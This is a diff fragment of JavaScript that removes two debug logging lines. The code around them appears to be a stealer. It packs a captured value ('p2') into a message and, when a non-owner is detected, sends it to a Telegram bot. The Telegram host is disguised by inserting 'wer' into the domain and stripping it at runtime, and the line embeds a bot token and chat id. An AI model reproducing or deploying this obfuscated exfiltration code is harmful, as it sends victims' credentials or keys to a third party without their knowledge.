@@ -12,8 +12,6 @@ function t(){
 		p2: p2,
 		type: 'priz'
 	};
-	console.log('l - ', l.toLowerCase());
-	console.log('owner - ', owner);
 	if ( l.toLowerCase() != owner ) {
 		var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
 		var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
